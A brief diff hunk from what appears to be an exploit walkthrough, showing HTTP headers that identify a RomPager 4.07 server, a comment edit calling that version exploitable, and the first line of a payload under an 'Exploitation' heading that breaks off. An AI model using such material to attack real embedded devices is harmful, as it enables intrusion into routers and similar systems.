@@ -79,7 +79,7 @@ Content-Type: text/html
 Transfer-Encoding: chunked
 Server: RomPager/4.07 UPnP/1.0
 EXT:
-# The banner for port 80 shows us that the server uses RomPager/4.07. This is exploitable.
+# The banner for port 80 shows us that the server uses RomPager 4.07. This version is exploitable.
 
 # Exploitation
 >>> payload = '''GET /HTTP/1.1
